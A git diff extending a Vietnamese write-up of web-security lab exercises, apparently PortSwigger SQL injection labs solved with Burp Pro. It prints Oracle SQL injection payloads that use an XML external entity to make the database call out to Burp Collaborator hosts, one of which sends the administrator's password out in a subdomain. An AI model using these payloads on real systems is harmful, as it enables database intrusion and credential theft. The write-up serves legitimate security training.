@@ -334,4 +334,71 @@ Tôi dùng `2 UNION SELECT username||':'||password FROM users<@/hex_entities>` �
 
 ![image](https://github.com/user-attachments/assets/d0971f66-8155-4f07-9d24-9f6f3d65058d)
 
-Vậy là gần xong hết, còn 2 bài do không burp pro
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/c7e59c26-e513-4095-96ca-3c7c50c0a16e)
+
+Đã có burp pro, let go, để làm bài này thì đọc cheatsheet 
+
+![image](https://github.com/user-attachments/assets/59f2a5a0-1157-4083-8ac2-80ed1c9d6684)
+
+Sau khi thử thì payload đây `m3hnMZHrFQa2HOz5'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//q2tcxv51hroox6wnei0by82cw32uqnec.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--+-`
+
+![image](https://github.com/user-attachments/assets/ca125313-0e77-4337-9153-519d49ee9587)
+
+![image](https://github.com/user-attachments/assets/9df4b651-067d-48bf-86b8-cc84265b9bca)
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/04849464-10e8-4b15-9f69-a9e40df996bd)
+
+
+Bài này lúc đầu tôi thử payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://yfhka3i9uz1wae9vrqdjbgfk9bf23yrn.oastify.com?test='||(SELECT password FROM users WHERE username='administrator')||'"> %remote;]>'),'/l') FROM dual -- -` thì có thấy gửi về nhưng không thấy tham số test đâu
+
+![image](https://github.com/user-attachments/assets/15ec4ebb-ee06-4b2b-b7e9-cb5838ee20c6)
+
+Hỏi chatgpt thì ngoài sử dụng tham số thì có thể dùng subdomain, tôi dùng payload `mTzSPGIWX6BwMXS'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.4otqj9rf35a2jki10wmpkmoqiho8c60v.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+--+-` và ra
+
+![image](https://github.com/user-attachments/assets/89fc390f-89b4-4d9c-952d-b24e467cbf61)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
